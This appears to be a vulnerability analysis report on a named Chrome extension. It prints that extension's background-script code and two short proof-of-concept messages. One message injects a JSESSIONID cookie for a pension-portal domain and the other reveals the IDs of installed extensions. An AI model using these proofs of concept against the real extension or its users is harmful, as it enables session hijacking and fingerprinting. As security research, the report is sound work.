# CoCo Analysis: ggceoihfkhmbgaclkpbifiomflhlmjnb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: bg_chrome_runtime_MessageExternal -> chrome_cookies_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ggceoihfkhmbgaclkpbifiomflhlmjnb/opgen_generated_files/bg.js
Line 968     const jsessionId = request.jsessionId;

**Code:**

```javascript
// Background script (bg.js) - Lines 965-1017
chrome.runtime.onMessageExternal.addListener(
  (request, sender, sendResponse) => {
    if (request.action === "setJSESSIONID") {
      const jsessionId = request.jsessionId;  // <- attacker-controlled
      const token = request.token;  // <- attacker-controlled
      const expediente = request.expediente;  // <- attacker-controlled
      const sagcomVersion = request.sagcomVersion;  // <- attacker-controlled

      if (sagcomVersion === 1) {
        if (!jsessionId) {
          sendResponse({ error: "jsessionId no proporcionado" });
          return;
        }

        // Setting cookie with attacker-controlled value
        chrome.cookies.set(
          {
            url: "https://sagcom.portalafp.cl",
            name: "JSESSIONID",
            value: jsessionId,  // <- attacker-controlled
            sameSite: "no_restriction",
            path: "/sagcom",
            secure: true,
          },
          (cookie) => {
            if (chrome.runtime.lastError) {
              sendResponse({ error: chrome.runtime.lastError.message });
              return;
            }

            // Opens tab with session cookie
            chrome.tabs.create({
              url: "https://sagcom.portalafp.cl/sagcom/programs/login/security.LoginAction.do?action=continueLoginApia",
            });

            // Sends message to content script with attacker data
            setTimeout(() => {
              chrome.tabs.query(
                {
                  url: "https://sagcom.portalafp.cl/sagcom/programs/login/security.LoginAction.do?action=continueLoginApia",
                },
                (tabs) => {
                  tabs.forEach((tab) => {
                    chrome.tabs.sendMessage(tab.id, {
                      action: "query",
                      expediente: expediente,  // <- attacker-controlled
                    });
                  });
                }
              );
            }, 3000);
            sendResponse({
              result: "JSESSIONID recibido y cookie establecida",
            });
          }
        );
      } else if (sagcomVersion === 2) {
        if (!token) {
          sendResponse({ error: "token no proporcionado" });
          return;
        }
        chrome.tabs.create({ url: "https://www.sagcom.cl/acceso" });
        setTimeout(() => {
          chrome.tabs.query({ url: "https://www.sagcom.cl/acceso" }, (tabs) => {
            tabs.forEach((tab) => {
              chrome.tabs.sendMessage(tab.id, {
                action: "loginSagcom2",
                token: token,  // <- attacker-controlled
              });
            });
          });
        }, 2000);
      }

      return true;
    }
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From whitelisted domains in manifest (localhost:34499, localhost:5173, localhost:3000,
// 200.29.77.235:34499, sagcom.facm.cl)
chrome.runtime.sendMessage(
  "ggceoihfkhmbgaclkpbifiomflhlmjnb",  // Extension ID
  {
    action: "setJSESSIONID",
    jsessionId: "attacker_session_id",
    expediente: "malicious_payload",
    sagcomVersion: 1
  },
  (response) => {
    console.log("Cookie set:", response);
  }
);
```

**Impact:** Cookie injection attack. Attacker from whitelisted domains can set arbitrary JSESSIONID cookies for sagcom.portalafp.cl, potentially enabling session hijacking or authentication bypass. The extension then opens a new tab with the malicious session cookie and sends attacker-controlled data to the content script. Even though only specific domains are whitelisted, per the methodology: "Even if only ONE domain/extension can trigger it → TRUE POSITIVE".

---

## Sink 2: management_getAll_source -> sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ggceoihfkhmbgaclkpbifiomflhlmjnb/opgen_generated_files/bg.js
Line 1041     const extension = extensions.find(ext => ext.name === request.name);
Line 1043     sendResponse({ id: extension.id });

**Code:**

```javascript
// Lines 1039-1050
if (request.action === "getExtensionIdByNameSagcom") {
  chrome.management.getAll((extensions) => {  // Get all installed extensions
    const extension = extensions.find(ext => ext.name === request.name);  // <- attacker controls search
    if (extension) {
      sendResponse({ id: extension.id });  // <- Sends extension ID back to attacker
    } else {
      sendResponse({ error: "Extension not found" });
    }
  });
  return true;
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From whitelisted domains
chrome.runtime.sendMessage(
  "ggceoihfkhmbgaclkpbifiomflhlmjnb",
  {
    action: "getExtensionIdByNameSagcom",
    name: "Any Extension Name"
  },
  (response) => {
    if (response.id) {
      console.log("Extension ID leaked:", response.id);
      // Attacker can now target this extension
    }
  }
);
```

**Impact:** Information disclosure. Attacker from whitelisted domains can enumerate installed extensions by name and retrieve their IDs. This enables extension fingerprinting and can be used to target specific extensions with known vulnerabilities.
